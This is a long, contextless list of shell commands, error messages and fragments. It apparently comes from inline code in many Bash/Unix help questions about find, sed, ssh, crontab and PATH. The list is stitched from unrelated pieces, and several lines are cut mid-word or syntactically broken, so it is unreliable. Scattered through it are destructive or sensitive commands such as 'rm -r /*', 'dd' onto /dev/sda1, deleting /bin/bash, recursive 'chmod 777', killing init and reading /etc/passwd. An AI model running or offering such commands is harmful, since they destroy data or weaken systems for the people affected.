[[ "$1" =~ ^[0-9]$ ]]
export  PATH=${PATH/java[0-9]/java$1}
pkill -9 -f proxy
/bin/sh -version
date -d yesterday +%z
Melvv - Glide.mp3
eyeD3 --genre=  --to-v2.3  --no-tagging-time-frame  --remove-comments  --add-image=$BASEPATH/$RELPATH/folder.jpg:OTHER:folder.jpg $SONG.mp3"
ERROR: RTMP_ReadPacket, failed to read RTMP packet header
if $line 'not numeric' ...
$ grep --version
$ grep -h
$ grep --help
tail -r
tac file
awk '/---/ {exit} {print}'
raw'' cpu calculation that ignores
con''. This is followed by a
<defunct>'', and a process which is blocked while trying to exit is listed as
scps filename
sudo crontab -e
(\b.+) \1\b
sudo crontab -e
-rwxr-xr-x 1 root root 845 Nov 23 06:21 launch.sh
sudo crontab -e
man 5 sudoers
#!/bin/bash -i
ssh -v user@server
echo -n $'\e]0;Hello World\a'
man 5 terminfo
echo "$(tput sgr0)"
echo -e "\e[0m"
forever start myapp.js
forever list
echo $HOME
unset HOME
forever list
bash -x
alias maxhinex="ssh machinex -l root"
sshx 1
nohup plexmediaserver &
su [user] -c '/usr/bin/compress_audio.sh > /home/[user]/audio_compress.log'
find * | wc -l
for f in *; do echo "$f"; find "$f" | wc -l ; done
echo find "$f" | wc -l
echo find "$f"
sha1sum_cur != sha1sum_prev
CALL system(./script2)
eval `/usr/bin/modulecmd bash $*`
which mc
:help cmdline-editing
ln -s
call :ping
'sed s/PackingList.*\>/PackingList/g' xmlfile
echo 1
Artist - Title [FREE DL].mp3
Artist - Title [FREE DL] [PREMIERE].mp3
Artist - Title.mp3
find . -type f -name "* - * \[*\].mp3" -o -name "* - * \[*\] \[*\].mp3" -execdir bash -c 'for file in "$@"; do new=${file% \[}.mp3; mv -v "$file" "$new"; done' _ {} +
\( -name ... -o -name ... \)
${file% \[}
${file% \[*}
${file%% \[*}
airport -I
ifconfig enX
networksetup -getairportnetwork enX
cp -r patch/A/B dest/A/B
find -type f | xargs -I {} cp {} ...
rsync -Aax /input/directory/path /output/directory/path
cp -r patch/A/B dest/A/B
cp -r patch/A dest/A/
unzip my_file.zip -d /var/tmp/my_dir 2> /dev/null
man unzip
unzip --help
unzip -qq $file -d $dest
export HOSTNAME=xyz
echo $HOSTNAME
su -
/etc/hostname oldname
hostname newname
man hostname
bash /home/pi/boot.sh
cat /dev/null
while TRUE; sleep 1; elihw
{some busy program}
cat /dev/null > [something]
cat /dev/null
rm /var/log/messages && touch /var/log/messages
cat /dev/null > [something]
cat /dev/null > file
cat /dev/null
cat /dev/null
> file
cat /dev/null
cat /dev/null
cp -p
cp --parents
mkdir -p
man find
man dirname
man basename
for d in *\ ??-??; do mv "$d" "$d//<something>/<something>"; done
nohup <cmd>
cp Somefile
echo mkdir
bash -c expect -c 'expect "exit" {send "Exiting\n"}';
man bash
help read
replace \- ""
tr -d
echo $COMMAND_TO_EXECUTE
bash -c "$COMMAND_TO_EXECUTE"
"foo "$1" --option1 --option2 "$2
"foo \"$1\" --option1 --option2 $2"
bash -c
bash -c
rvm list
set compatible
-u NONE
man 8 update-altnernatives
echo $b
sed -n '2,3p' test.txt
sed '2,3p' test.txt
sed -n 's/t/T/' test.txt
sed 's/t/T/' test.txt
sed -n 's/t/T/p' test.txt
sed 's/t/T/p' test.txt
sed '2,3p; 3p' test.txt
write user [tty]
-exec "ssh user@10.0.0.11 -t 'tmux attach' "
man bash
sort u
-exec command {} \;
-exec command {} +
command {} \;
command {} +
find . -iname '*.jpg'
while read file ; do
mogrify -format pdf "$file";
mkdir -p "$pdfdir";
mkdir -p "$savedir";
mv -- "$olddir$newfile" "$pdfdir$newfile";
mv -- "$olddir$oldfile" "$savedir$oldfile";
ls | head
-ctime +1
-type d
find /data/oozie-admi/ -type d -ctime +1
xargs rm -rf
. ~/.bash_profile
su -
ls ../
sudo cp /usr/sbin/ntpd /usr/sbin/ntpd.old
No such file
Directory not found
echo $PATH
echo $PATH
tail -f /var/log/messages
which bash
tar cvzf hello.tgz fg
[[ $1 == "" ]]
[[ ! -f $1 ]]
export PATH="/bin:/sbin:/usr/bin:/usr/sbin"
var somethingB
var somethingB
var somethingB
/var somethingB/
var somethingB
/var somethingB/
type cd
help <command>
sudo -u myUser ...
if [[ -z $(lsof -i :${service_port}) ]]; then
lsof -u postgres | wc -
| sort -rnk 2
bash -c <command>
cygstart --help
set -x
man bash
set -x
C-x *
zip warning: name not matched: "filename.jpg"
CONCAT('\"', ifnull(products_image, ''), '\"'),....
for in
for image in *.png; do convert "$image" -resize 29.5% "$(dirname $image)/th_$(basename $image)"; done
for images in *.png
patch -b <<EOF
find ./*.jpg --exec mv {} <number_of_iteration>.jpg
for i in $(ls -tr $path); ...
$(ls -tr $path)
man bash
urxvtc -e bash -c "sleep 0.1; pkill sxhkd; sleep 0.1; bspc window -t fullscreen=on; sleep 0.1; cmatrix -u 9 -s; sleep 0.1; vlock; sleep 0.1; sxhkd"
urxvtc -e bash -c "echo hello!; sleep 3; pavucontrol"
urxvtc -e bash -c "echo hello!; sleep 3; pavucontrol &"
nohup my_command &
nohup program & exit
nohup command & sleep 2 && exit
sudo visudo
sudo -u username mybashcommand
bytes from
mv arg1 $(sed arg1 's/regex/replace/')
rm -rf
command not found
chmod 777
ls -R blah*
rm -fr blah*
ls -R
rm -fr
"string *"
string chars
string letters
^ls -R^rm -rf
alias rm='trash'
mkdir trashcan
rm -rf trashcan/*
rm -rf *
rm whatever* -rf
| tac
| tail -r
mv 1.png 2.jpg dir/
-iv --
rm -f file.txt
ls -li filename
find <the same filesystem> -inum <inode>
source ~/.zshrc
ls | awk '/xyz/{print $1}'
ls | awk '/^xyz/{print $1}'
some other commands
some other command
GNU bash, version 3.2.53(1)-release (x86_64-apple-darwin13)
exp_internal 1
top -l
set -o vi
Arrow up
type kill
ls -l /usr/bin/zip
sudo chattr o-x /usr/bin/zip
echo "command" | ssh user@remote_host
ssh -t -t
echo "command" | ssh -tt user@remote_host
ssh -tt
stty sane
stty sane
set -x; source aaa.sh; set +x
++ ls --color /ahksfjkasd
find . -maxdepth 1 -type f -print0
xargs -L1 -p0 chmod +x
| sed
first task:
read -d'' -s -N 1 char
-N 1
ls -l /usr/bin/python*
ls -l | grep easy_install
sudo easy_install six
missing operand after "764"
chmod 764 <dir-name>
chmod 764 */
echo foo*
chmod 764 -- */
chmod 764 --
service --status-all| grep sensu
evince *
evince *
echo *
grep -A17
blah | grep stuff -A17 | awk "NR==1{print} NR==8{print} NR==17{print;exit}"
awk "(NR-1)%17 == 0{print} (NR-8)%17 == 0{print} (NR-17)%17 == 0{print}"
pwd -P
pwd -X
cd -P
cd -L ~/linked
--jobs 1
echo "Hello world. | nc -l 4444
nc -l 4444 < /path/to/some/large.file
find / .bash_profile
find / .bash_profile &
find / -name .bash_profile >my_result.txt 2>/dev/null &
tail my_result.txt
kill %1
poll: 0
ssh nfs@example.com
ssh -vvv
debug1: Remote: Forced command.
sudo crontab -e
sudo ./update.sh
hash table
man bash
hash client
hash -d client
hash -r
info coreutils sync
hash -d ./client; ./client
sync ; ./client
hash -d ./client ;  sync ; ./client
(cd .. ; cd - ; ./client )
apt-get install proxychains
proxychains firefox
-exec rm -r "{}" \;
ps | grep run_dumper.sh
chsh -l
bash -c 'false uselessparm1 uselessparm2'
shopt -s globstar
dpkg -iR <folder-of-debs>
sudo kill -9 7238
-t 15000
kill -9
man bash
#kill -9 init
man find
stat -c %y "$1"
(($(stat -c %Y "$1") % 86400))
Add users to group
usermod -a -G groupname username
which git
git --version
hub alias
ls -lR source
find source -type f
echo `cat /root/root_file`
james.mosier@fs215:~%                                  9:59 james.mosier@fs215
echo $PS1
echo $(build_prompt)
PS1="%n@%m:%~%# "
PS1="$ [%~] "
RPROMPT='%{$reset_color%}%T %{$fg_bold[white]%} %n@%m%{$reset_color%}
sudo su
sudo su - specialuser
sudo su
man ssh
tar --show-omitted-dirs
myLS() { echo "$@"; ls "$@"; }
myLS() { echo "$@" | tr " " "\n"; ls "$@"; }
myLS() { printf '%s\n' "$@"; ls "$@"; }
$ zip -r directoryname.zip directoryname
-not -name "dir"
-maxdepth 1
-type d
-mindepth 1
-not -name "dir"
-mindepth 1
-not -name "dir"
bash myscript.sh
bash -l
sar -u
sar 300
xfce4-terminal -x
xfce4-terminal -x command
xfce4-terminal -H -x command
$last_col =~ ^[[:digit:]]+$
$NF != 0
for i in *; do zip -r "$i.zip" $i; done
--move --test
'Red Hat'
crontab -e
if {[file exists $fileName] }
**Line 9 of the personal config is unparsable
alias minicom="minicom -w"
minicom -s
sudo n latest
node -v
which node
alias node=nodejs
[[ "╝" = [█] ]]
man test
-e create -e moved_to
--format %f
scp user@remote_host:~/he*.txt ./he*_copy.txt
sed s/_copy\.txt$/.txt/
for f in "$@"
rename 'y/A-Z/a-z/' *
mv, but
mv foo.file boo.file
mv dir1/foo.file dir2/boo.file
mv dir1/foo.file dir2/boo.file dir3/woo.file
The destination path for each operand is the pathname produced by the concatenation of the last operand, a slash, and the final pathname component of the named file.
last operand
final pathname
mv file.a file.b
mv dir.a dir.b
ls -i file.a
ls -i file.b
mv OldPath/file.a NewPath/file.a
mv OldPath/file.a NewPath/file.b
mv -t /long/path/to/dir file1 file2 ...
sudo bash
sudo -u anotherUser bash
su -l anotheruser -c bash
[screen is terminating]
screen zsh
screen sh
sudo bash
sudo -u anotheruser zsh
su -l anotheruser -s zsh
su -l anotheruser -c zsh
sudo bash
-exec cmd {}
xargs -I
xargs -I{} cmd
find -exec cmd {} +
find | xargs
find -print0 | xargs -0
find -exec cmd {} +
ls -l
echo $PS1
echo $0
echo $SHELL
for (i in a)sub(i, a[i])
-i inplace
sed 's!\(.*\):\(.*\)!s/\1/\2/!' file1
sed -f <(…) file2
cat /etc/passwd | grep $USER
-rw-r--r-- 1 root root
-bash: Searching: command not found
-bash: Searching: command not found
-bash: Searching: command not found
echo $PATH
echo $PATH
No such file or directory
command not found
mongrel_rails start -e production -p 80
sh /etc/mongrel.sh
exit 0
sh /etc/mongrel.sh
screen -d -m *command*
crontab -e
@reboot sh /etc/mongrel.sh
/bin/bash/sh /etc/mongrel.sh
alias pandoc='~/.cabal/bin/pandoc'
help hash
echo $PATH
vi /etc/passwd
if echo $something | egrep "^($srsp)$" > /dev/null
if [ ... ]
while read
while read
sites=("site1.ru site2.ru site3.ru")
sleep 1 && stackoverflowfanatic
find … -exec
for variable in wildcard
find … -exec
> "{}"
echo {}
find -exec
find -exec
find -exec
find … -exec
ss -s
Total: 973 (kernel 996)
TCP:   600 (estab 280, closed 73, orphaned 0, synrecv 0, timewait 0/0), ports 333
Total: 973 (kernel 996)
ports 333
estab 280
closed 73
Total: 973 (kernel 996)
tail -f
tail -f
sudo chmod 777 -R /opt
cat /proc/net/dev
chmod 755 traffic.sh
python script_name.py &
Ctrl+X, Ctrl+C
Ctrl+X, Ctrl+C
ps aux | grep script_name.py
kill <pid>
ps aux
-arch ppc
pip install scikit-learn
cd `dirname /your/file/path`
cd "$(dirname "$1")"
cd !$:h
git add
--post-file params.txt
cat EMP.txt | tail –n  +2
echo $var | cut -d "," -f6
ls 'asdf asdf'
ls '$f'
ls "$f"
ls 'asdf asdf'
$ help test
-x FILE
Picked up JAVA_TOOL_OPTIONS: -javaagent:/usr/share/java/jayatanaag.jar
unset JAVA_TOOL_OPTIONS
bzip -d
rm "$file"
rm $file
tail -f /var/log/syslog | egrep --line-buffered "my search string" > tmp.txt & python script.py | tee result.log
script -c "ls" result.log
script result.log
ls -l1 /System/Library/Filesystems/
xargs -0
cd ..
builtin cd ..
which builtin
SHELL BUILTIN COMMANDS
man bash
help test
help test
man test
cmd1 && cmd2 && cmd3
ifdown eth0
ifdown eth0 && ifup eth0
cmd1 && cmd2 && cmd3
commandA && commandB
commandA || commandB
cmd1 && cmd2 && cmd3
sudo bash
xmodmap -pke | grep percent
keycode 14 = 5 percent 5 percent
xmodmap -e "keycode 14 = 5 U203D 5 UD203D"
cat ~/.inputrc
cat /etc/inputrc
uname -a
myFunc to[Tab]
myFunc top
compaudit | xargs chmod g-w
name@my-computer ~/code/sample (master)$
M-x shell
tail -n
M-x pdb
pdb test.py
M-x space
PermitUserEnvironment yes
argument list too long
-name "*.pdf"
-maxdepth 1
-type f
-exec mv {} ../ \;
mv <FILENAME> ../
defaults write com.apple.finder AppleShowAllFiles TRUE
/usr/bin/vi .bash_profile
rm -v
| /bin/sh
ls -dt */ | cut -f1 -d'/'
bash main.sh
bash -f main.sh
man bash
ps aux | grep '/Applications/Google Chrome.app'
ps -L
ps ax -o pid,comm
ps ax -o pid,args
ps axww -o pid,args
rm -rf
ps ---pid <my bash's pid which I got with echo $$>
ps --pid
ps ---pid
echo $$
ps --pid number
ps --pid $$
ps --pid PID_of_shell
ps -l | grep PID_of_shell
grep 42
PAGER=cat  man  man_page_topic
ssh host 'ls -als'
echo -e '\0033\0143'
if [ -t 1 ]
nift sh
nift sh
cp -f absolute-destination {}
cp -f {} absolute-destination
-name "*"
-amin -120
 and the last 
while [[ -n $(jobs) ]]
jobs -r
jobs -r
while [[ -n $(jobs) ]]
ls -li
find . -inum <inode-number> -exec rm -i {} \;
gedit ~/.bashrc
apt-get install virtualenvwrapper
apt-get remove virtualenvwrapper
sudo nano /usr/share/virtualenvwrapper/virtualenvwrapper_lazy.sh
bind -sp | sort | less
-w 5
RDP response:
-exec mv
cat -v
tail -f /var/log/apache2/error_log
sudo apachectl restart
ls -R | awk '/<!--/,/-->/' >> result
awk '/<!--/,/-->/' >> result
<!-- some text here -->
ls -R
cat *
exit 0
bash -x
set -x
set +x
echo <<EOF
du -shl . *A
some long-running command
long-running command
long-running command
long-running command
sudo sleep 0
sh -c
long-running command
man ncat(1)
echo 'flush_all' | ncat -i 10s localhost 11211
./script.sh --daemon
$(echo ...
uname -r
-X POST
cp -r /home/user/source/ /home/user/destination/
cp: cannot stat /source/filename.xxx
cp: cannot stat /source/고정폭.collection
ls -l
ls -l /etc/rc0.d/
cmd /c cls
echo '$(!!:p)' > /tmp/tmptxt.txt
echo $JOB_COUNTER
. ./test.sh
CPU MHz:  800  2401
sar -P ALL 1 1
tr '\n' '\t'
ls test*
ls test\*
sudo chown nobody folder/
sudo chown nobody: folder/
/./{p; ba;}
c <tab><tab>
cd <tab><tab>
3 file name with spaces
ls -Q
sed -i '$NEWTEXT' -e '$OLDTEXT'
gpg man
ls *(mh+24)
mv *
mv *
mv test test1 test2 test3
echo *
cp temp temp*
ls *
dir *.*
echo *
cp /tmp/temp temp*
grep -A 1 bbb file.txt
ssh-agent -s
ssh-add ~/.ssh/id_rsa
ssh-add ~/.ssh/id_rsa/myname.ssh
ssh-add ~/.ssh/id_rsa/myname.pub
could not open a connection to your authentication agent
C:\cygwin\bin\mintty.exe -i /Cygwin-Terminal.ico -
ps -A
-a -x
! -iname '*sample*'
-iname '*.jpg'
/bin/bash Script1.sh > abc.txt
/bin/bash Script2.sh > abc.txt
read -p
the_command | tee abc.txt
man bash
sudo -n
sudo -n
sudo -n command &>/dev/null ; echo $?
git clone
int i
ln -s
lang=ru locale
mkdir -p
it wall always be the same folder
destpath. You then attempt to create
as given and on success copy
(with the
it wall always be the same folder
clock ls -R
exec "$@"
clock time ls -R
clock time foo
do this; do that; time foo
command please
sudo command
clock ls
exec bash -c ""$@""
eval $@
clock ls '~$Document1'
bash -c
clock time ls -l
clock 'time ls -l'
echo "do something"
eval "$@"
eval "$*"
clock whatever
bash -c
bash -c
watch 'ls -l'
ssh user@host 'ls -l'
watch 'ls -l | wc -l'
watch ls -l | wc -l
ssh user@host 'ls -l > foo.txt'
ssh user@host ls -l > foo.txt
might be a good idea, but think twice if you want
exec bash -c ""$@""
bash -c
clock ls -l
ls -l
will run
eval $@
clock ls '~$Document1'
watch ls '~$Document1'
watch ls '~\$Document1'
watch ls -l *.tmp
watch 'ls -l *.tmp'
eval "$@"
eval "${@@Q}"
clock ls '~$Document1'
clock 'time ls -l | wc -l'
clock time ls -l
clock ls '~$Document1'
clock 'time ls -l | wc -l'
clock time …
clock 'time …'
clock '*' …
clock './~$Document1' …
man find
for f in `grep -rsl "foo" . `: do sed -i -- "s/foo/bar/g" $f; done; 
vi $1
p test.txt 3
sgdisk -e
parted {device-file} resize...
sgdisk -e {device-file}
sgdisk -d...
sgdisk -n...
-map 0:a
("output" FILENAME)
man mesg
source ~/.bash_profile
No such file or directory
grep -Hrn 'b3' .
grep -C 3 'b3' path/to/files
su -l -s /bin/bash scriptuser -c 'nohup python3 '/etc/scriptroot/main.py > /dev/null 2>&1 &'
Server startup in
wget big_file...
rm -rf *
rm -rf *
mv . ./.
SOMETHING=1 && echo $SOMETHING
SOMETHING=1 echo $SOMETHING
-w out.wav
ssh me@server.com; cd sub/folders/
trap … TERM
trap … EXIT
rm $PIDFILE; exit $saved_status
rm $PIDFILE; exit $?
trap … KILL
C:\cygwin64\bin\bash.exe searchreplace.sh
tail -f
tail -f
tail -F
dotfiles (master)$
ret="£(ls "my
$ myprog < commandfile
grep real
awk '{ print $2 }'
shopt -s nullglob
$(some_command(s) …)
$(echo …)
unset IFS
a b             c
grep -C10000 -P --color pattern
grep -C10000 -P --color ".*$PWD.*"
tty |grep -q ^/dev/tty && echo "is console"
login session
stty -echo
stty echo
> /dev/null 2>&1
&> /dev/null
exec > /dev/null 2>&1
> /dev/null 2>&1
2>&1 >/dev/null
useradd -m
getent passwd olduser newuser
usermod -s /bin/bash newuser
dpkg-reconfigure locales
PS1='$(whoami)@$(hostname):$(pwd)$ '
-C <N>
-C 1000
man rg
cat my-file | hl '<REGEX>'
ps -ef | grep restart_forms
$ initvm
$ cd
git clone
brew install python
brew install
brew install python
id -Gn $USER
brew link -n python
pip --version
export PATH="$(brew --prefix)/opt/python/libexec/bin:$PATH"
brew info python
process the output
process the output
INIT INFO
<author type=''>
<author type='Local'>
<author type=''><\/author>
<author type='Local'><\/author>
--cwd `pwd`
--cwd `pwd`
qsub --cwd /home/jerry
shopt -s nullglob
source activate env
pdfunite $(ls handout*.pdf*) merged.pdf
xterm -e "ls; sleep 3"
--command 
, -e 
--execute 
, -x 
-e 
 --command=
-c cipher
-c cipher_spec
~/spaceengineers/start.sh -x spaceengineers
screen --help
-dmS name
cd /path/to/last/dir
/usr/local/bin/bash --noediting -i
cd /path/to/last/dir
login -pfl camdennarzt /bin/bash -c 'exec -la bash /usr/local/bin/bash'
if [ ! -f $FILE ]
sleep 5h
stty sane
\[ \]
cd c:\wheremyfilesare
man sudoers
ps ax | grep asterisk
4457 pts/0    S      0:00 /bin/sh /usr/sbin/safe_asterisk
4459 pts/0    Sl     0:01 /usr/sbin/asterisk -f -vvvg -c
4457 pts/0    S      0:00 /bin/sh /usr/sbin/safe_asterisk -U asterisk -G asterisk
4459 pts/0    Sl     0:01 /usr/sbin/asterisk -f  -U asterisk -G asterisk -vvvg -c
if... then fi
$server1=alphaserver $ipaddress1=192.168.1.2
sudo sh checkSpace.sh
sudo df ....
df /media/usb
set -x
printf "%q "
TZ="Australia/Sydney" date +'%s' -d "2015-05-20 18:05:02"
sec=$(TZ="Australia/Sydney" date +'%s' -d "2015-05-20 18:05:02")
TZ="America/Los_Angeles" date -d "@$sec"
bash -c
DEST=$(echo "$0" | sed -r "s/DLG([0-9]+)-.*/dialogue\1/");
mkdir "$DEST"
mv "$0" "$DEST"'
-y, --yes, --assume-yes
help set
set +i
set -i
set -i
set +i
set -i
set +i
set [+-]i
man bash
set -e
set -e
set -e
set -e
. MySource.sh FileToBeSourced.sh
# command not found
ls --color=always path | grep --color=never foo
cc -
cmp file1
cmp file1 -
diff file1 -
dd my_iso_file > /dev/sda1
bash CopyScript.sh
autocmd CursorHold
:help new-vim-server
vim --servername {name} --remove-expr
gcc compile
stat -c '%U:%G' home/userB/finalfolder
ssh-copy-id -i /Users/user/.ssh/id_rsa
ssh user@remotemachine 'some-remote-command'
Midnight Commander
cp /my/far/far/away/myfile .
cp ~/myfile .
cp myfile $OLDPWD
help bind
help complete
complete -p | less
help pushd
help popd
stall collectd
apt-get -y in
apt-get -
stall collectd
ests] >
sh -x yourscript
strace yourprogram 2> log
:let g:
:setf sh
0 block error
python arg &
if [$foo -ge 3]; then
comm -13 <(sort old.txt) <(sort new.txt)
cat $LINE | cut -f1
cat $LINE | cut -f4| sed s/\.pdf$/\.html/
-d " "
pkill -f
grep -lrI foo .
LIBTOOL=$(which libtool)
which libtool
grep -R foo .
2>&1 | grep -vE “Binary|/tmp/|/test/“
grep -R foo . <thingie>
Java (jdk 1.8)
Java EE 7 SDK
Universal Zip Installer
Universal Zip Installer
Java EE
bash: permission denied message
bash: Command not found
OS X
Yosemite 10.10,
chmod 0770 path/to/target
echo '$HOME/dir'
editing ~/.bash_profile
history -c
history -w
history -cw
history -w
history -r
history -w
history -w
history -c
history -w
sbatch test.sh
srun -n 2
rm -rf
rm -rf
Directory not empty
cd ~
rm -r
[[ -f "$pid_file ]] && (cat "$pid_file" | head -n 1 | tr -d "\n")
[[ ! -f "$pid_file ]] || (cat "$pid_file" | head -n 1 | tr -d "\n")
nvm install
sudo yum clean metadata
sudo yum clean all
local IFS=""
env | cat
ls --color=auto
ls --color=auto | cat
-bash: !: event not found
find -type f -exec md5sum '{}' ';' | sort | uniq --all-repeated=separate -w 33 | cut -c 35-
cp -rp
man cp
rsync -t
man rsync
bindfs -u bob /mnt ~/usb
cd ..
cd /home/username/
cd ~
echo $PATH
directory or file not found
not found
batch.sh [number of processes to use]
find . -name '*.html' | parallel gzip --best
exec mycommand "foo bar baz" qux
perl -x
. ~/.bash_profile
. ~/.bash_profile
[ -d … ]
-n +2
tail -qn +2 job19_beta{1..100000}.txt
-n +2
echo $var | grep ...
echo $var | grep -e "Some"
2>&1 |
`date +%s`
rm -r /*
/bin/bash: bad interpreter: Text file busy
su -c
sudo su
sudo su
echo $PATH
which myscript.py
which mytex.py
source ~/.bashrc
make -f Makefile.maclap
alias g77=/usr/local/bin/gfortran-5
gfortran-5: fatal error: no input files compilation terminated
make -f Makefile.maclap
make install
$(g77 -w -c -o Abfind.o Abfind.f)
source ~/.alias
Hello Adriano
Hello Adriano here I am for you
/bin/bash -c
/bin/bash -c
git push
Writing objects: 13% (53/402), 664.00 KiB  | 970.00 KiB/s
Writing objects: 14% (57/402), 984.00 KiB | 117.00 KiB/s
Writing objects: 13% (53/402), 664.00 KiB  | 970.00 KiB/s
Writing objects: 14% (57/402), 984.00 KiB | 117.00 KiB/s
print $0
find -type f -name "*.c"
cproto <i>file</i>
<code>double myfunction(int a,char b);
alias gfortran-4.8='gfortran'
source .bashrc
line 10: syntax error near unexpected token ('
mv !\(error|stats|_wordpress-site|static-site\) _wordpress-site
mv '!(error|stats|_wordpress-site|static-site) _wordpress-site'
mv: missing destination file operand after ‘!(error|stats|_wordpress-site|static-site) _wordpress-site’
. bash_profile
. ./.bash_profile
. .bash_profile
chmod 755 change_path.sh
./change_path.sh [otherProductName]
interpret the lines in your script
> output.txt
> output.txt
ls -lrt
<<<"path is $PATH"
mycmd -
Window > Save As Window Group
screen -DRA
|| true
mintty /usr/bin/zsh -
sudo arp -da
man bash
man bash
chmod u+x go.sh
/bin/bash go.sh
stat -c "%a %n"
myscript /usr/bin /usr/bin/X /usr/bin/bsd-write
OUT=$(git describe HEAD)
fatal: No names found, cannot describe anything.
pgrep python
man pgrep
python x
python ./path/to/x
-e socket,connect,close,write,read
history -a
history -a
PROMPT_COMMAND="history -a; history -c; history -r"
exec bash
echo "abc\"def\""
echo "abc'def'"
echo 'abc'\''def'\''hij'
-c file
printf '\e[0m'
set t_te="^[[H^[[2J,"
My Documents
My Documents
db_home: unix /%H/Apps/cygwin/home/shaun
sox input.wav output.wav trim 0 1 gain 1 : trim 0 1 gain 2 : trim 0 1 gain 1
trim 0 1 gain X
source ~/.profile
source ~/.bashrc
source ~/.profile
source ~/.bashrc
diskutil list
diskutil mount $(diskutil list | grep -i 'Macintosh\ HD' | awk '{print $6}' | grep -i 'disk0s')
mount | awk '/on \/ / {print $1}'
awk '/Logical Volume/ {print $NF}'
-d arg
GNOME terminal
man bash
man tmux
set -o vi
set -o emacs
cd a; ls
export PATH=.:$PATH
head: 1: invalid number of lines
set -x
+ local 'line=1'
++ local line=1
++ line='1'
set -x
... | grep --color=never
... | \grep ...
gzip -c aum.dmp |
ssh -l oracle 192.168.0.191
'cat > /export/home/oracle/aum.dmp.gz'
> /export/home/oracle/aum.dmp.gz
man scp
mawk -Winteractive
stdbuf -o0
ssh target
ssh -N -L 2003:localhost:22 tunnel
screen -d -m ssh -N -L 2003:localhost:22 tunnel
ssh target
ssh target
screen -r
screen -r
complete -p <command>
complete -p screen
complete -o default -F _screen screen
screen -r
screen -r
tail -1
(^| )
Bash 3.2.57
[ _-]
_My New File Name.jpg
/media/.../Matlab/bin $ sudo ./matlab
./matlab: command not found
ls /bin/sh
ef bb bf
ls -A
echo *
help shopt
for file in {.*,*}; do echo "$file"; done
ls -A
make intelO3
make all
-o $<
OBJS=file1_$(FC).o file2_$(FC).o
$(MAKE) FC=ifort FFLAGS=-O3 SUFFIX=_intel_O3
X_gfortran.o X_ifort.o: X.f90
man inotifywatch
printf "\033[1;44;97m"
ansi '1;35m'
bash -lc
ssh ufk@10.0.0.3 "bash -lc 'pm2 list'"
echo $HISTFILE
less /private/etc/bashrc_Apple_Terminal
-bash: syntax error in conditional expression
man bash
[[ … ]]
( expression )
! expression
expression1 && expression2
expression1 || expression2
[[ … ]]
apt-get install openjdk-7-jre
alias java="echo Java!"
$ /path/to/script/foo.sh &
bash 3.2.25
grep -E
grep --color=always
less -R
less -p
less fileToShow.txt
Pattern not found  (press RETURN)
not found
cat /dev/somedevice | grep 'test'
echo 'test 17'
bash file.py
bash file.py
. file.py
source file.py
file.py: line 4: syntax error near unexpected .....
/usr/bin/python ./script.py
bash ./script.py
ssh -v
bash -v
--reject 'index.*'
-e robots=off
-bash: /dev/cu.usbserial: Permission denied
sh -c
find … -exec sh -c "…" {} ";"
PermitRootLogin no
PROMPT_COMMAND='history -a'
apt-get install wine
sudo apt-get install wine
Clone Path
Default Shell
echo -e \\033c
asdf: command not found
declare -f -p
find -type f |xargs file| grep -iv 'jpeg'
find . -type f
-type f
-exec bash -c 'file -bi "$1" | grep -q image/jpeg || rm "$1"' none {} \;
file -bi "$1" | grep -q image/jpeg
find .
-type f
! -name '*.jpeg'
-name '*.jpeg'
! -name '*.jpeg'
export MAGICK_HOME="$HOME/ImageMagick-6.9.2"
export PATH="$MAGICK_HOME/bin:$PATH"
export DYLD_LIBRARY_PATH="$MAGICK_HOME/lib/
Unable to open password file /etc/passwd for reading: Permission denied
ls -ld /
apt-get install exiv2
shopt -s nullglob
for fname in *.jpg *.png *.gif; do
read width height < <(exiv2 "$fname" 2>&1 | awk '/^Image size/{print $4,$6}')
[ "$width" ] || continue
[ "$width" -lt 1600 ] && rm "$fname"
-bash: /.bashrc: No such file or directory
vim ~/.bashrc
emacs ./bashrc
man bash
. ~/.bashrc
$config['reply_all_mode'] = 0;
$config['reply_all_mode'] = 1 ;
-c copy
rename .. "" ..*
Save Output As...
Select All
man xterm
man xsel
bash -l
sleep 2
dpkg -l
apt --installed list
pkgutil --pkgs
npm list
npm list -g --depth=0
ls `npm root -g`
pkgutil --pkgs
alias push-bb="ssh-agent /bin/bash && ssh-add ~/.ssh/bitbucker_rsa && git push"
ssh-agent /bin/bash
ssh-add ~/.ssh/bitbucket_rsa
ssh-agent /bin/bash
ssh-add ~/.ssh/bitbucket_rsa
ps xf
brew doctor
brew update
--dump-header mysession_cookies
--cookie mysession_cookies
echo -n ....
sublime .
ln -s
alias sublime="/Applications/Sublime\ Text.app/Contents/SharedSupport/bin/subl"
ln -s "/Users/username/Library/Mobile Documents/com~apple~CloudDocs/.zshrc" ~/.zshrc
export icloud="/Users/username/Library/Mobile Documents/com~apple~CloudDocs"
ls -l /usr/bin/passwd
set -H
Oracle Audit\[
grep -R "rails" /workspace/rails-apps/ --include="Gemfile"
grep -R "rails" /workspace/rails-apps/*/main --include="Gemfile"
-T /path/to/file
ls -l /proc/<PID of mbuffer>/fd
sh .fehbg
sh .fehbg
exec i3
COMMAND=$(php travis_groups.php)
echo "ls"
bash run_echoed.sh
php travis_groups.php
ps -A
df -i
expect stop
[ $num -le $seasons ]
$[ $num + 1 ]
help test
man bash
read -d
read -r
find "$(pwd)" -type d | while read -r D; do ls -lb "${D}"; done
-print0 | xarg -0
$ man ls
$ rm "$(echo -en "\r")"
$ echo "TEST" >"This is a filename with a CR _$(echo -en "\r")_here"
$ rm "This is a filename with a CR _$(echo -en "\r")_here"
Hello World
Hello World
> file
:> file
:> file
: >file
while ...;do read -r ...;done <otherfile >file
read -r
! -name ...
man find
find test2 -prune -o -print
ssh targethost rsync ...
echo */ | wc
mkdir -p
Created subdir ${pre}
ls -1
$ sudo chmod a-x /bin/bash_old /bin/sh_old
login: /bin/bash: No such file or directory.
mv /bin/bash /bin/bash_old
rm /bin/bash
C-x C-r
else alternate-consequents
chmod 755 ./command.sh
chmod a+x filename
mdutil -E -i off /
man mdutil
mdutil -E -i off /
-i off
ls -la /Volumes/
Hard Drive
Hard Drive
chown filename.ext
sudo crontab -e
ls -la /home/siconet/do_backup.sh
sudo su -
root@SF-DES-SVN:/home/svn# crontab -l
for chan; do
~/Applications/Sublime\ Text.app/Contents/SharedSupport/bin/subl .
ln -s <above path> /usr/local/bin
subl .
subl <some file>
open ~/.bash_profile
export PATH=
source ~/.bash_profile
echo $PATH
[your username]
[your username]
hostname -i
man hostname
man systemctl
man systemd.service
which wine
wine install.exe
wine install.exe
export PATH
export PATH
$ wine <xyz program>
sh /screenfetch.sh
sh ~/Downloads/screenfetch.sh
SHELL := /bin/bash
